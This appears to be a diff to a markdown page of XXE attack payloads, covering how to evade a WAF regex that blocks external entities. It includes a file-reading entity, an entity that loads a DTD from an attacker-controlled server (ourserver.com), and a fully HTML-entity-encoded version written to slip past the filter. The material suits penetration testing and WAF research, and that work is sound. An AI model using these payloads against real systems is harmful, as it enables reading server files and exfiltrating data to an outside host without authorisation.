@@ -6,11 +6,14 @@ A usefull technique to bypass WAF forbiden words like SYSTEM is using html entit
 
 This is also valid for a regex in this case we will bypass the following regex `/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im`
 
-This regex is stoping us to create a external entity with the following structure 
+This regex is stoping us to create a external entity with the following structure: 
 
-`<!ENTITY file SYSTEM "file:///path/to/file">` to avoid this we are going to use html entities to encode `<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd" >` so we can call our dtd in a server we control.
+`<!ENTITY file SYSTEM "file:///path/to/file">` 
+To avoid this we are going to use html entities to encode `<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd" >` so we can call our dtd in a server we control.
 
 The html entity equivalent is `&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3E;`
+
+The idea here is to use this entity to bypass the SYSTEM word to call our controlled dtd. This way we only have to bypass the WAF/REGEX one time and we can craft any entity we need on our dtd.
 
 #### Server payload
 
